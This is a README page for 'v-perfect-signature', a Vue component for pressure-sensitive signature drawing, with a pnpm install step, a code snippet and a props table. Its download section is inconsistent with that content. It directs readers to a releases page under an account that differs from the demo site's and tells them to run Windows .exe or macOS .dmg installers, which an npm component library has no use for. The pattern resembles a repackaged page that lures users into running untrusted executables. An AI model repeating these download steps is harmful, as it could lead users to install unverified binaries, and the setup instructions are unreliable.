---
layout: "default"
title: "✍️ v-perfect-signature - Effortless Signature Drawing Made Easy"
description: "✍️ Create pressure-sensitive signatures in Vue 2 and 3 easily with v-perfect-signature, built on perfect-freehand for smooth drawing."
---
# ✍️ v-perfect-signature - Effortless Signature Drawing Made Easy

[![Download v-perfect-signature](https://img.shields.io/badge/Download-v--perfect--signature-blue.svg)](https://github.com/Yetuvina/v-perfect-signature/releases)

## 🚀 Getting Started

Welcome to v-perfect-signature! This tool allows you to easily draw pressure-sensitive signatures in your Vue applications.

To get started, follow these steps to download and set it up.

## 📥 Download & Install

1. Visit this page to download: [v-perfect-signature Releases](https://github.com/Yetuvina/v-perfect-signature/releases).

2. Choose the latest version from the list.

3. Download the files for your platform (Windows, macOS, or Linux). 

4. Follow the installation instructions based on your operating system below:

   - **Windows**: Run the `.exe` file and follow the prompts.
   - **macOS**: Open the `.dmg` package and drag the application to your Applications folder.
   - **Linux**: Extract the files and follow any additional setup instructions provided in the package.

5. Once installed, you can include v-perfect-signature in your Vue project.

## 📋 Features

- **Pressure-sensitive drawing**: Create smooth and natural signatures.
- **Compatibility with Vue 2 and 3**: Easy integration into different Vue setups.
- **Customizable stroke options**: Adjust size, thinning, smoothing, and streamline for perfect results.
- **Ease of use**: Designed for non-developers to create signatures effortlessly.

## 📖 Usage

To use v-perfect-signature in your Vue application, follow these steps:

1. Inside your Vue project, add v-perfect-signature by running:

   ```bash
   pnpm add v-perfect-signature
   ```

2. Use the following code snippet in your component:

   ```vue
   <script setup>
   import { ref } from 'vue'
   import { VPerfectSignature } from 'v-perfect-signature'

   const signaturePad = ref()
   const strokeOptions = {
       size: 16,
       thinning: 0.75,
       smoothing: 0.5,
       streamline: 0.5,
   }

   function toDataURL() {
       const dataURL = signaturePad.value.toDataURL()
       console.log(dataURL)
   }
   </script>

   <template>
       <VPerfectSignature ref="signaturePad" :stroke-options="strokeOptions" />
   </template>
   ```

3. This code sets up a signature pad. You can customize the `strokeOptions` to fit your signature style.

## ⚙️ Props

Here are the available properties you can use to customize your signature pad:

| Name              | Type   | Default                                                              | Description                    |
| ----------------- | ------ | -------------------------------------------------------------------- | ------------------------------ |
| `width`           | String | `100%`                                                                | Specifies the width of the pad |
| `height`          | String | `300px`                                                              | Specifies the height of the pad |
| `stroke-options`  | Object | `{ size: 16, thinning: 0.75, smoothing: 0.5, streamline: 0.5 }`    | Configures the stroke settings  |

## 🔧 System Requirements

- **Operating System**: Windows 10 or later, macOS Mojave or later, Linux (Ubuntu recommended).
- **Node.js**: Version 12 or higher.
- **Vue version**: Compatible with Vue 2.6 and Vue 3.x.

## 💬 Support & Feedback

If you have questions or require assistance, feel free to open an issue on the GitHub repository. We aim to help you as quickly as possible.

## 🌐 Learn More

Explore the demo at [Demo Site](https://wobsoriano.github.io/v-perfect-signature) to see v-perfect-signature in action. 

Your signature experience awaits! 